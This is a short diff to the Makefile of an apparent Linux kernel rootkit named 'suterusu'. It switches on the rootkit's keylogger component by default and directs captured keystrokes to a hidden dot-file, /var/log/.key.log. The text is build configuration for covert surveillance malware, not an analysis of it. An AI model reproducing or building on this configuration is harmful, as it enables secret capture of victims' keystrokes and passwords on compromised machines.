@@ -1,5 +1,10 @@
 obj-m += suterusu.o
 suterusu-objs := main.o util.o module.o
+KDIR   := /lib/modules/$(shell uname -r)/build
+PWD    := $(shell pwd)
+KEYLOGGER := 1
+LOGFILE := /var/log/.key.log
+
 
 ifdef KEYLOGGER
 	suterusu-objs += keylogger.o
